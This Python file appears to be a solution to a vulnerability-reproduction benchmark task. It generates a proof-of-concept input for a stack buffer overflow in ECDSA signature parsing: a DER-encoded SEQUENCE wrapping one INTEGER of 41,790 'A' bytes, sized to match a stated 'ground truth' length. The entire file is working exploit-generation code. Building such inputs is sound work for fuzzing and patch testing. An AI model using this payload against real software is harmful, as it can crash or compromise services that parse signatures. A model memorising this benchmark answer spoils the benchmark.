import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Stack Buffer Overflow in ECDSA signature parsing logic (ASN.1).
        The ground truth PoC length is 41798 bytes, suggesting a large payload is required
        to overflow a stack buffer (likely due to copying an ASN.1 INTEGER into a fixed-size buffer).
        
        We construct a DER-encoded SEQUENCE containing a single large INTEGER.
        """
        
        def encode_asn1_length(length):
            """Encodes length in ASN.1 DER format."""
            if length < 128:
                return bytes([length])
            else:
                length_bytes = []
                temp = length
                while temp > 0:
                    length_bytes.insert(0, temp & 0xFF)
                    temp >>= 8
                return bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)

        # Target Total Size: 41798 bytes
        # Structure: SEQUENCE (Tag + Len) { INTEGER (Tag + Len + Data) }
        #
        # Overhead calculation:
        # INTEGER Tag (1 byte)
        # INTEGER Length (3 bytes for size ~41000: 0x82 XX XX)
        # SEQUENCE Tag (1 byte)
        # SEQUENCE Length (3 bytes for size ~41000: 0x82 XX XX)
        # Total Overhead = 8 bytes.
        #
        # Required Data Size = 41798 - 8 = 41790 bytes.

        data_len = 41790
        # Use 0x41 ('A') to ensure the integer is interpreted as positive (MSB 0)
        # preventing potential parsing errors with negative numbers.
        data = b'\x41' * data_len

        # Construct INTEGER (Tag 0x02)
        tag_int = b'\x02'
        len_int = encode_asn1_length(data_len)
        der_int = tag_int + len_int + data

        # Construct SEQUENCE (Tag 0x30)
        tag_seq = b'\x30'
        len_seq = encode_asn1_length(len(der_int))
        poc = tag_seq + len_seq + der_int

        return poc
